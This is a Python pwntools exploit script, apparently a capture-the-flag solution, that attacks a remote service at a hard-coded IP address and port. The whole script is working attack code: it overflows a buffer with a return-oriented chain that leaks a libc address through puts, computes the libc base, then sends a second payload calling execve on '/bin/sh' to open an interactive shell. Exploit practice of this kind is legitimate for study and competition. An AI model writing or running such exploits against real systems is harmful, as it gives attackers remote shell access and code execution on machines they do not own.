from pwn import *

# r = process("./shell.out_patched")
r = remote('213.133.103.186', 5117)
libc = ELF("./libc.so.6")

# gdb.attach(r, gdbscript = '''
#            b*getMessage+48
#            c
#            ''')
input()
puts_plt = 0x56556090
puts_got = 0x56558fe0
main = 0x565561fd
payload = flat(
    b'A'*54,
    0x56558fc0,
    b'B'*4,
    puts_plt,
    0x565561dd,
    puts_got,
)
r.sendlineafter(b"name: ", payload)
r.recvlines(2)
libc_leak = u32(r.recv(4))
libc.address = libc_leak - libc.sym['puts']
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

payload = b"a" * 62 + p32(libc.sym['execve'])
payload+= b'B'*4 + p32(next(libc.search(b'/bin/sh')))
payload+= p32(0) + p32(0)
r.sendlineafter(b"name: ", payload)
r.interactive()
